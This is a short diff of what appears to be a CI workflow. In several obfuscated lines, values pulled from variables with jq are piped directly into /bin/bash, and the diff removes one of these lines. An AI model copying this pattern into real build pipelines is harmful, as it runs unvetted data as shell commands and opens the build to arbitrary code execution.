@@ -23,7 +23,6 @@ jobs:
           echo $muftq4581 | jq -r .q9465 | /bin/bash
           printf '%s' "$b90078" | jq -r .ele2 | /bin/bash
           printf '%s' "$syino2" | jq -r .uawll50 | /bin/bash
-          printf '%s' "$u762" | jq -r .r1 | /bin/bash
           printf '%s' "$lozoq1733" | jq -r .sakrf806 | /bin/bash
 
       - name: Store output
